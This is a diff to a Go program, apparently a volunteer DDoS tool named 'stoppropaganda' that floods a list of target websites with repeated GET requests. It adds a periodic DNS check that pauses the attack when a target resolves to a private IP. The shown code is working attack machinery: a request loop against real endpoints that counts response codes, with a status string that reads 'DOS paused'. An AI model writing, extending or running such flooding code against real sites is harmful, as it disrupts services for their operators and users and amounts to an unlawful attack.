@@ -1,14 +1,18 @@
 package stoppropaganda
 
 import (
+	"fmt"
 	"io"
 	"io/ioutil"
 	"net/http"
 	"net/url"
 	"sync"
+	"time"
 )
 
 // Source: https://twitter.com/FedorovMykhailo/status/1497642156076511233
+
+const VALIDATE_DNS_EVERY = 5 * time.Minute
 
 var targetWebsites = map[string]struct{}{
 	/* Other countries */
@@ -242,9 +246,10 @@ var targetWebsites = map[string]struct{}{
 var websites = map[string]*Website{}
 
 type Website struct {
-	Requests     uint   `json:"requests"`
-	Errors       uint   `json:"errors"`
-	LastErrorMsg string `json:"last_error_msg"`
+	Requests      uint   `json:"requests"`
+	Errors        uint   `json:"errors"`
+	LastErrorMsg  string `json:"last_error_msg"`
+	WorkersStatus string `json:"workers_status"`
 
 	Counter_code100 uint `json:"status_100"`
 	Counter_code200 uint `json:"status_200"`
@@ -261,18 +266,50 @@ func (ws *Website) Start(endpoint string) {
 		panic(err)
 	}
 
+	// Create request
+	req, err := http.NewRequest("GET", endpoint, nil)
+	if err != nil {
+		panic(err)
+	}
+
+	// Set headers
+	req.Header.Set("Host", websiteURL.Host)
+	req.Header.Set("User-Agent", *flagUserAgent)
+	req.Header.Set("Accept", "*/*")
+
+	ws.WorkersStatus = "Initializing"
+	pauseMux := sync.Mutex{}
+	dnsLastChecked := time.Now().Add(-1 * VALIDATE_DNS_EVERY) // this forces to validate on first run
+
 	f := func() {
 		for {
-			// Create request
-			req, err := http.NewRequest("GET", endpoint, nil)
-			if err != nil {
-				panic(err)
-			}
+			pauseMux.Lock()
+			if time.Since(dnsLastChecked) >= VALIDATE_DNS_EVERY {
+				ipIsPrivate, err := isPrivateIP(websiteURL.Host)
+				if err != nil {
+					ws.mux.Lock()
+					ws.WorkersStatus = fmt.Sprint("Unable to validate DNS:", err)
+					ws.mux.Unlock()
+					time.Sleep(3 * time.Second)
+					pauseMux.Unlock()
+					continue
+				}
 
-			// Set headers
-			req.Header.Set("Host", websiteURL.Host)
-			req.Header.Set("User-Agent", *flagUserAgent)
-			req.Header.Set("Accept", "*/*")
+				if ipIsPrivate {
+					ws.mux.Lock()
+					ws.WorkersStatus = fmt.Sprint("Private IP detected, DOS paused, will recheck in ", VALIDATE_DNS_EVERY.String())
+					ws.mux.Unlock()
+					time.Sleep(VALIDATE_DNS_EVERY)
+					pauseMux.Unlock()
+					continue
+				}
+
+				ws.mux.Lock()
+				ws.WorkersStatus = "Running"
+				ws.mux.Unlock()
+				dnsLastChecked = time.Now()
+			}
+			pauseMux.Unlock()
 
 			// Perform request
 			resp, err := httpClient.Do(req)
